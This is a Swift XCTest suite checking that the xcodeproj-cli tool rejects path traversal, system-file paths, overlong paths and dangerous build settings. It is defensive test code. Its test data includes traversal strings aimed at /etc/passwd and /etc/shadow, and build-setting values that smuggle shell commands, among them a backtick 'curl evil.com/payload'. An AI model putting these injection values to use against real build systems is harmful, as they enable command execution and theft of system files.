import XCTest
import Foundation

final class SecurityTests: XCTestCase {
    
    static var binaryPath: URL {
        return productsDirectory.appendingPathComponent("xcodeproj-cli")
    }
    
    var createdDirectories: [URL] = []
    
    override class func setUp() {
        super.setUp()
        // Binary path is now computed, no need to set it
    }
    
    override func tearDown() {
        // Remove any directories we created during tests (reverse order to remove children first)
        for directory in createdDirectories.reversed() {
            try? FileManager.default.removeItem(at: directory)
        }
        createdDirectories.removeAll()
        super.tearDown()
    }
    
    // MARK: - Path Traversal Tests
    
    func testBlocksPathTraversal() throws {
        let dangerousPaths = [
            "../../etc/passwd",
            "../../../System/Library",
            "../../../../private/etc",
            "..\\..\\Windows\\System32"
        ]
        
        for path in dangerousPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()

            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject path traversal: \(path)")

            // Error messages go to stderr in ArgumentParser CLI
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            let error = String(data: errorData, encoding: .utf8) ?? ""
            let combined = output + error
            XCTAssertTrue(
                combined.contains("Invalid file path") || combined.contains("Error") || combined.contains("Invalid"),
                "Should show error for dangerous path: \(path). Got stdout: \(output) stderr: \(error)"
            )
        }
    }
    
    func testBlocksURLEncodedTraversal() throws {
        let encodedPaths = [
            "%2e%2e%2f%2e%2e%2fetc/passwd",
            "..%2f..%2fetc",
            "%2e%2e%5c%2e%2e%5cwindows"
        ]
        
        for path in encodedPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp", 
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject encoded traversal: \(path)")
        }
    }
    
    func testBlocksCriticalSystemPaths() throws {
        let criticalPaths = [
            "/etc/passwd",
            "/etc/shadow",
            "/System/Library/LaunchDaemons",
            "/usr/bin/sudo",
            "/private/etc/sudoers"
        ]
        
        for path in criticalPaths {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp", 
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertNotEqual(process.terminationStatus, 0, "Should block critical path: \(path)")
        }
    }
    
    func testAllowsLegitimateProjectPaths() throws {
        let legitimatePaths = [
            "Sources/MyApp/AppDelegate.swift",
            "Resources/Assets.xcassets",
            "Tests/MyAppTests.swift"
        ]
        
        for path in legitimatePaths {
            // Create a temporary file for testing
            let testDir = URL(fileURLWithPath: "Tests/xcodeproj-cliTests/TestResources")
            let filePath = testDir.appendingPathComponent(path)
            
            // Create directories if needed and track only those we created
            let directoryPath = filePath.deletingLastPathComponent()
            if !FileManager.default.fileExists(atPath: directoryPath.path) {
                try FileManager.default.createDirectory(
                    at: directoryPath,
                    withIntermediateDirectories: true,
                    attributes: nil
                )
                createdDirectories.append(directoryPath)
            }
            
            // Create the file
            try "// Test".write(to: filePath, atomically: true, encoding: .utf8)
            defer { try? FileManager.default.removeItem(at: filePath) }
            
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "add-file", path, "--group", "Sources", "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()
            
            // Check that it's not rejected for security reasons
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            
            // Should not contain security-related error messages
            XCTAssertFalse(
                output.contains("Invalid file path") && output.contains("dangerous"), 
                "Should not reject legitimate path as dangerous: \(path). Got: \(output)"
            )
        }
    }
    
    // MARK: - Build Settings Security Tests
    
    func testBlocksDangerousBuildSettings() throws {
        let dangerousSettings = [
            ("OTHER_LDFLAGS", "\"-Xlinker @executable_path/../../../etc/passwd\""),
            ("OTHER_SWIFT_FLAGS", "\"-Xcc -D$(shell cat /etc/passwd)\""),
            ("OTHER_CFLAGS", "\"-DVALUE=`curl evil.com/payload`\""),
            ("LD_RUNPATH_SEARCH_PATHS", "\"@loader_path/../../../../usr/bin\"")
        ]
        
        for (key, value) in dangerousSettings {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "set-build-setting", key, value,
                "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            let outputPipe = Pipe()
            let errorPipe = Pipe()
            process.standardOutput = outputPipe
            process.standardError = errorPipe
            
            try process.run()
            process.waitUntilExit()

            // Check if the dangerous setting was properly rejected
            let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
            let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
            let output = String(data: outputData, encoding: .utf8) ?? ""
            let error = String(data: errorData, encoding: .utf8) ?? ""
            let combined = output + error

            // Dangerous settings should be rejected
            XCTAssertNotEqual(process.terminationStatus, 0, "Should reject dangerous setting: \(key)=\(value)")
            XCTAssertTrue(
                combined.contains("potentially dangerous") || combined.contains("Error") || combined.contains("Invalid"),
                "Should show security error for dangerous setting \(key)=\(value). Got stdout: \(output) stderr: \(error)"
            )
        }
    }
    
    func testAllowsSafeBuildSettings() throws {
        let safeSettings = [
            ("SWIFT_VERSION", "5.9"),
            ("PRODUCT_NAME", "MyApp"),
            ("DEVELOPMENT_TEAM", "ABC123XYZ"),
            ("CODE_SIGN_IDENTITY", "iPhone Developer")
        ]
        
        for (key, value) in safeSettings {
            let process = Process()
            process.executableURL = Self.binaryPath
            process.arguments = [
                "set-build-setting", key, value,
                "--targets", "TestApp",
                "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
            ]
            
            try process.run()
            process.waitUntilExit()
            
            XCTAssertEqual(process.terminationStatus, 0, "Should allow safe setting: \(key)=\(value)")
        }
    }
    
    // MARK: - Path Length Tests
    
    func testRejectsExtremelyLongPaths() throws {
        let longPath = String(repeating: "a", count: 2000) + ".swift"
        
        let process = Process()
        process.executableURL = Self.binaryPath
        process.arguments = [
            "add-file", longPath, "--group", "Sources", "--targets", "TestApp",
            "--project", "Tests/xcodeproj-cliTests/TestResources/TestProject.xcodeproj"
        ]
        
        let outputPipe = Pipe()
        let errorPipe = Pipe()
        process.standardOutput = outputPipe
        process.standardError = errorPipe
        
        try process.run()
        process.waitUntilExit()

        let outputData = outputPipe.fileHandleForReading.readDataToEndOfFile()
        let errorData = errorPipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: outputData, encoding: .utf8) ?? ""
        let error = String(data: errorData, encoding: .utf8) ?? ""
        let combined = output + error

        XCTAssertNotEqual(process.terminationStatus, 0, "Should reject extremely long paths")
        XCTAssertTrue(
            combined.contains("too long") || combined.contains("maximum") || combined.contains("Invalid") || combined.contains("Error"),
            "Should show appropriate error message for long path. Got stdout: \(output) stderr: \(error)"
        )
    }
    
    // MARK: - Private Helpers
    
    static var productsDirectory: URL {
        #if os(macOS)
        for bundle in Bundle.allBundles where bundle.bundlePath.hasSuffix(".xctest") {
            return bundle.bundleURL.deletingLastPathComponent()
        }
        fatalError("couldn't find the products directory")
        #else
        return Bundle.main.bundleURL
        #endif
    }
}
